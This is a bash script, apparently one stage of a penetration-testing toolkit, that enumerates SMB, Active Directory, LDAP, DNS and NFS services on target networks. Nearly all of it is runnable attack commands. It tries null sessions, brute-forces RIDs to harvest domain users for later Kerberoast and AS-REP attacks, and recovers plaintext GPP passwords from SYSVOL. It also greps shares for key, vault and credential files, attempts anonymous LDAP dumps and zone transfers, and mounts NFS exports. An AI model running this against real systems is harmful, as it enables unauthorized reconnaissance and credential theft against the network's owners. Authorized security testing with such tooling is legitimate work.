#!/usr/bin/env bash
# ==========================================================================
# 03-enum-smb-ad.sh  -  SMB / NetBIOS / LDAP / Kerberos enumeration.
# Unauthenticated by default; uses creds from config.sh if present.
# ==========================================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./config.sh
source ./lib/common.sh
RUN="${RUN:?RUN not set}"
OUT="$RUN/03-smb-ad"; mkdir -p "$OUT"; LOG="$OUT/smb.log"
SMB="$RUN/hosts_smb.txt"; DC="$RUN/hosts_dc.txt"

phase "SMB / AD Enumeration"
NXC=$(nxc_bin) || { warn "netexec/crackmapexec not found — SMB enum limited."; NXC=""; }

# Build auth args once.
AUTH=(-u "${USERNAME:-}" )
if   [[ -n "$NTHASH"   ]]; then AUTH+=( -H "$NTHASH" )
elif [[ -n "$PASSWORD" ]]; then AUTH+=( -p "$PASSWORD" )
else                            AUTH=(-u '' -p ''); fi   # null session
[[ -n "$USERNAME" ]] && ok "Using credentials: ${DOMAIN:+$DOMAIN\\}$USERNAME" \
                     || log "No creds set — attempting null/guest sessions."

if [[ -n "$NXC" && -s "$SMB" ]]; then
  log "SMB host info, signing status, OS/domain (nxc)"
  run "$LOG" "$NXC" smb "$SMB"                                 # banner: OS, signing, domain
  log "Enumerate shares"
  run "$LOG" "$NXC" smb "$SMB" "${AUTH[@]}" --shares -o "$OUT/shares"
  log "Enumerate users / password policy / RID brute"
  run "$LOG" "$NXC" smb "$SMB" "${AUTH[@]}" --users    | tee "$OUT/users.txt"
  run "$LOG" "$NXC" smb "$SMB" "${AUTH[@]}" --pass-pol
  run "$LOG" "$NXC" smb "$SMB" "${AUTH[@]}" --rid-brute 4000 | tee "$OUT/rid_brute.txt"
  log "GPP cpassword / autologin in SYSVOL (decrypts to plaintext creds)"
  run "$LOG" "$NXC" smb "$SMB" "${AUTH[@]}" -M gpp_password   2>/dev/null | tee -a "$OUT/gpp.txt" || true
  run "$LOG" "$NXC" smb "$SMB" "${AUTH[@]}" -M gpp_autologin  2>/dev/null | tee -a "$OUT/gpp.txt" || true
  grep -iE 'password|cpassword|userName' "$OUT/gpp.txt" 2>/dev/null | grep -viE 'not found|no gpp' \
    | sort -u > "$OUT/gpp_creds.txt" || true
  [[ -s "$OUT/gpp_creds.txt" ]] && warn "GPP credentials recovered -> $OUT/gpp_creds.txt"

  log "Spider readable shares (index only, no download) for sensitive files"
  run "$LOG" "$NXC" smb "$SMB" "${AUTH[@]}" -M spider_plus \
    -o DOWNLOAD_FLAG=False OUTPUT_FOLDER="$OUT/spider" 2>/dev/null || true
  if [[ -d "$OUT/spider" ]]; then
    grep -rhoiE '[^"]+\.(kdbx|ps1|bat|vbs|cmd|config|conf|ini|xml|ya?ml|csv|xlsx?|docx?|bak|old|vmdk|ovpn|ppk|pem|key|pfx)' \
      "$OUT/spider" 2>/dev/null \
      | grep -iE 'pass|secret|cred|admin|backup|unattend|sysprep|\.kdbx|\.ps1|\.ovpn|\.ppk|\.pem|\.pfx|\.key' \
      | sort -u > "$OUT/sensitive_files.txt" || true
    [[ -s "$OUT/sensitive_files.txt" ]] && warn "Potentially sensitive files indexed -> $OUT/sensitive_files.txt"
  fi
fi

# Per-host deep enum with enum4linux-ng (rich on null/guest).
if have enum4linux-ng && [[ -s "$SMB" ]]; then
  enum_host() {
    local ip="$1"
    enum4linux-ng -A -oJ "$OUT/e4l_$ip" "$ip" >"$OUT/e4l_$ip.txt" 2>&1 || true
    printf '%s[+]%s enum4linux-ng %s done\n' "$C_GRN" "$C_RST" "$ip"
  }
  export -f enum_host; export OUT C_GRN C_RST
  log "enum4linux-ng per host (parallel)"
  parallelize enum_host < "$SMB"
fi

# Pull a clean username list from RID brute for AS-REP / Kerberoast collection later.
if [[ -f "$OUT/rid_brute.txt" ]]; then
  grep -oP '(?<=\\)[A-Za-z0-9._-]+(?= \(SidTypeUser\))' "$OUT/rid_brute.txt" \
    | sort -u > "$RUN/domain_users.txt" || true
  [[ -s "$RUN/domain_users.txt" ]] && ok "Harvested $(wc -l <"$RUN/domain_users.txt") users -> domain_users.txt"
fi

# ---- LDAP / Kerberos against DCs ------------------------------------------
if [[ -s "$DC" ]]; then
  phase "Domain Controller LDAP enumeration"
  while read -r dc; do
    log "anonymous LDAP rootDSE / naming contexts on $dc"
    run "$LOG" ldapsearch -x -H "ldap://$dc" -s base namingcontexts 2>/dev/null || true

    # Derive base DN (and domain) from rootDSE for the deeper queries below.
    basedn=$(ldapsearch -x -H "ldap://$dc" -s base defaultNamingContext 2>/dev/null \
      | awk -F': ' '/defaultNamingContext/{print $2}' | tr -d '\r')
    dom="$DOMAIN"
    [[ -z "$dom" && -n "$basedn" ]] && dom=$(sed 's/DC=//gI; s/,/./g' <<<"$basedn")

    # Anonymous full subtree dump (only works if anonymous bind is allowed).
    if [[ -n "$basedn" ]]; then
      if ldapsearch -x -H "ldap://$dc" -b "$basedn" "(objectClass=*)" \
           > "$OUT/ldap_anon_$dc.txt" 2>/dev/null && [[ -s "$OUT/ldap_anon_$dc.txt" ]] \
           && grep -q "numEntries" "$OUT/ldap_anon_$dc.txt" 2>/dev/null; then
        warn "Anonymous LDAP bind ALLOWED on $dc -> $OUT/ldap_anon_$dc.txt"
        grep -oiE '^sAMAccountName: .*' "$OUT/ldap_anon_$dc.txt" 2>/dev/null \
          | awk '{print $2}' | sort -u >> "$RUN/domain_users.txt" || true
      fi
    fi

    # DNS zone transfer (AXFR) — instant internal hostname map if misconfigured.
    if have dig && [[ -n "$dom" ]]; then
      log "DNS AXFR attempt: $dom @ $dc"
      dig AXFR "$dom" "@$dc" +noall +answer > "$OUT/axfr_${dc}.txt" 2>/dev/null || true
      if [[ -s "$OUT/axfr_${dc}.txt" ]]; then
        warn "DNS zone transfer SUCCEEDED from $dc -> $OUT/axfr_${dc}.txt ($(wc -l <"$OUT/axfr_${dc}.txt") records)"
      else
        rm -f "$OUT/axfr_${dc}.txt"
      fi
    fi

    # Richer DNS enumeration (std records, SRV, AXFR) against this DC/DNS.
    if have dnsrecon && [[ -n "$dom" ]]; then
      log "dnsrecon (std + SRV + axfr): $dom @ $dc"
      dnsrecon -n "$dc" -d "$dom" -t std,srv,axfr -j "$OUT/dnsrecon_${dc}.json" \
        >>"$LOG" 2>&1 || true
      [[ -s "$OUT/dnsrecon_${dc}.json" ]] && ok "dnsrecon -> $OUT/dnsrecon_${dc}.json"
    fi
  done < "$DC"
  [[ -s "$RUN/domain_users.txt" ]] && sort -u -o "$RUN/domain_users.txt" "$RUN/domain_users.txt"

  if [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] && have ldapdomaindump; then
    log "Authenticated full domain dump (ldapdomaindump)"
    cred="${PASSWORD:-}"; [[ -n "$NTHASH" ]] && cred=":$NTHASH"
    while read -r dc; do
      mkdir -p "$OUT/ldd_$dc"
      run "$LOG" ldapdomaindump -u "$DOMAIN\\$USERNAME" -p "$cred" \
        -o "$OUT/ldd_$dc" "$dc" || true
    done < "$DC"
  fi
fi
# ---- NFS export enumeration (read-only) -----------------------------------
NFS="$RUN/hosts_nfs.txt"
if [[ -s "$NFS" ]] && have showmount; then
  phase "NFS export enumeration"
  : > "$OUT/nfs_exports.txt"
  while read -r ip; do
    [[ -n "$ip" ]] || continue
    raw=$(showmount -e "$ip" 2>/dev/null || true)
    paths=$(grep -oE '^/[^[:space:]]*' <<<"$raw" || true)
    [[ -n "$paths" ]] || continue
    ok "NFS exports on $ip:"; echo "$raw"
    { echo "=== $ip ==="; echo "$raw"; } >> "$OUT/nfs_exports.txt"

    # Read-only mount of each export to list top-level contents (recon only).
    if [[ "${NFS_MOUNT:-true}" == "true" ]]; then
      while read -r exp; do
        [[ -n "$exp" ]] || continue
        mp=$(mktemp -d)
        if sudo mount -t nfs -o ro,nolock,soft,timeo=30,retry=0 "$ip:$exp" "$mp" 2>/dev/null; then
          { echo "--- $ip:$exp (top level) ---"; ls -la "$mp" 2>/dev/null; } >> "$OUT/nfs_listing.txt"
          sudo umount "$mp" 2>/dev/null || true
        fi
        rmdir "$mp" 2>/dev/null || true
      done <<< "$paths"
    fi
  done < "$NFS"
  [[ -s "$OUT/nfs_exports.txt" ]] && ok "NFS exports -> $OUT/nfs_exports.txt"
  [[ -s "$OUT/nfs_listing.txt" ]] && ok "NFS top-level listings -> $OUT/nfs_listing.txt"
fi

ok "SMB/AD enumeration complete -> $OUT"
